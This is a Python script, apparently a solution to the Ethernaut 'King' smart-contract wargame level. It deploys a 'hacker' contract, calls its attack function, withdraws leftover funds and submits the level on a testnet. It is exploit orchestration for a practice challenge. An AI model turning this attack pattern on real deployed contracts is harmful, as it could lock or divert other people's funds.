from ape import accounts, project
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0x55CAae46869d905A91A691F0d18513e4E3FD446E"


def main():
    # setting up user and ethernaut contract
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(
        ETHERNAUT, LEVEL, user, value="0.001 ether"
    )

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.King.deploy(instance, sender=user, value="0.0011 ether")

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    hacker.attack(sender=user)

    print(f"\n--- Balance of your hacker contract is: {hacker.balance} ---\n")

    if hacker.balance > 0:
        print("\n--- Withdrawing remaining funds in contract ---\n")
        hacker.withdraw(sender=user)

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
